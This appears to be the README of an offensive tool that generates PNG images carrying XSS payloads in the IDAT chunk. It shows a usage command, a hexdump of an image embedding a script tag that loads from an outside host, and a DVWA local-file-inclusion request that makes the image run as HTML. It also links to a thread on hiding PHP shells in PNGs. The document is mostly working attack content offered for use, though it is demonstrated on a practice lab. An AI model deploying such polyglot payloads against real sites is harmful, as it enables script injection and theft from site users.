# PNG-XSS
Image-Based XSS Attack Vector Generator

### Usage
```
~/$ python3 exploit.py -p "<script>alert(1);</script>" -o xss_payloads.png
```
### Example Payloads Will Generated as

<img src="xss.png">

```
~/$ hexdump -C xss.png 
00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
00000020  a3 00 00 00 79 49 44 41  54 78 9c 63 fc 3c 53 43  |....yIDATx.c.<SC|
00000030  52 49 50 54 20 53 52 43  3d 2f 2f 58 53 53 2e 56  |RIPT SRC=//XSS.V|
00000040  41 56 4b 41 4d 49 4c 2e  43 5a 3e 3c 2f 53 43 52  |AVKAMIL.CZ></SCR|
00000050  49 50 54 3e 20 a0 ff ba  e3 fc ab 7f cf dc 0c 7b  |IPT> ..........{|
00000060  c5 f2 d2 cb 43 f1 c1 fd  db 2a cf df de ff fc ff  |....C....*......|
00000070  f9 87 1f 56 7f ff f2 04  7a 5c bf 72 f7 ca b3 37  |...V....z\.r...7|
00000080  9a 7a 6b 3b fb 18 19 19  46 c1 28 18 05 a3 60 14  |.zk;....F.(...`.|
00000090  8c 82 51 30 0a 46 c1 28  18 05 43 0e 00 00 1b 22  |..Q0.F.(..C...."|
000000a0  26 02 5b 4d 02 76 00 00  00 00 49 45 4e 44 ae 42  |&.[M.v....IEND.B|
000000b0  60 82                                             |`.|
000000b2
````

#### Damn Vulnerable Web App
`http://dvwa/vulnerabilities/fi/?page=../../hackable/uploads/xss.png`

```
HTTP/1.1 200 OK
Date: Fri, 23 Aug 2019 00:13:37 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 3422
Connection: close

�PNG


IHDR  ���yIDATx�c�<SCRIPT SRC=\\XSS.VAVKAMIL.CZ></SCRIPT> �����=s3��K�_s������?��_�X1��	��~���go4��v�322��Q0
F�(�`��Q0
�4�%�۠IEND�B`�
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
```
### Stack Overflow
[PHP shell on PNG's IDAT Chunk](https://stackoverflow.com/questions/49144776/php-shell-on-pngs-idat-chunk)
